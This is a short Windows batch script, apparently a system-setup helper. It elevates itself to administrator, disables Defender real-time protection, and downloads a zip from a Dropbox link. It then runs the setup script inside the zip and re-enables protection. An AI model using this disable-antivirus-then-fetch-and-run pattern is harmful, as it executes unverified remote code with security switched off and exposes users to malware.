@NET SESSION > NUL 2> NUL || PowerShell -Command "Start-Process \"%0\" -Verb RunAs" && EXIT
@ECHO OFF
CD /D "%~dp0\..\Extra\"

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

PowerShell -Command "(new-object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/tfk8q6x46pq2m07/_oem_.zip?dl=1','_oem_.zip')"
PowerShell -Command "Expand-Archive -Path _oem_.zip -DestinationPath _oem_"

CALL _oem_\$oem$\$$\Setup\Scripts\SetupComplete.cmd
RD /S /Q _oem_
DEL _oem_.zip

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"

PAUSE
